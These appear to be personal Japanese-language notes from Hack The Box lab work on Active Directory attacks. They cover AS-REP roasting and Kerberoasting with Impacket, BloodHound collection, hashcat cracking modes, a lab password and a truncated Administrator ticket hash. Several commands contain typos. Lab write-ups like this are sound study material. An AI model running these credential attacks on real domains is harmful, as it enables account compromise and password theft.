## GetNPUsers.py (AS_REProast)

ASREPRoast攻撃により**Kerberos事前認証が不要**なユーザーを探索しそのパスワードハッシュの取得を狙う。

```
# specific user 
┌──(kali㉿kali)-[~]
└─$ GetNPUsers.py -no-pass -dc-ip 10.10.10.52 htb.local/mantis

# Using user list
┌──(kali㉿kali)-[~]
└─$ GetNPUsers.py htb.local/ -no-pass -dc-ip 10.10.10.161 -usersfile users.txt 
```

**krb5asrep**ハッシュのクラック：

```
┌──(kali㉿kali)-[~]
└─$ hashcat -a 0 -m 18200 hashfile /usr/share/wordlists/rockyou.tx
```

## Blood Hound from "LOCAL"

```
┌──(kali㉿kali)-[~]
└─$ bloodhound-python -u <domain account> -p <account's password> -ns <target's IP> -d <Domain> -c Al

(e.g.) $ loodhound-python -u svc_tgs -p GPPstillStandingStrong2k18 -ns 10.10.10.100 -d active.htb -c Al
```

## GetUserSPNs.py
指定したドメインアカウント下で動いてるSPN（Service Principal Name）を探す。

- -reqeust: TGS（サービスチケットを発行するサーバ）にリクエストを出す
- -save: TGSを保存する（<username>.ccacheのフォーマット）

```
┌──(kali㉿kali)-[~]
└─$ GetUserSPNs.py -request -dc-ip <target IP> <domain>/<user name> -save -outputfile GetUserSPNs.out

(e.g.) $ GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
```
  
(c.f. [0xdf hacks stuff](https://0xdf.gitlab.io/2018/12/08/htb-active.html#decrypting-gpp-password))

> I’ll use the GetUserSPNs.py script from Impacket to get a list of service usernames which are associated with normal user accounts. 
It will also get a ticket that I can crack. 
  
***GetUserSPNs.pyの結果Administratorのハッシュが取れた！！！***
  
```
┌──(kali㉿kali)-[~]
└─$ ls
Administrator.acache
GetUserSPNs.out
  
┌──(kali㉿kali)-[~]
└─$ cat GetUserSPNs.out
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$25bac967bc8a16...
```
  
注意）このハッシュは（**krb5tgs**）のhashcatでは「-m 13100」。ハッシュタイプ18200はAS_Repのハッシュ。

  
### GetNPUsers.pyとGetUserSPNs.pyについて
#### GetNPUsers.py -> "AS_REPRoasting"（存在するユーザ名のみでOK）
-> ASREPRoastingとは、ケルベロスチケットを要求する際にpre-authenticationを必要としないようなアカウントに対して、"Does not require Pre-Authentication"なる権限を持っている場合に起こる。

  
#### GetUserSPNs.py -> "TGS_REPRoasting"（存在するユーザ名とそのパスワード（それなりの権限が必要かも））
-> そのドメイン内のアカウントのクリデンシャルを知っていれば、それは普通にTGSに対して要求できるでしょ。で、その**TGS_REPにはSPNのハッシュが含まれている**。これをofflineでクラックすると。（Activeの場合は、AdministratorがSPNに関連してたのがセキュリティホールかな）
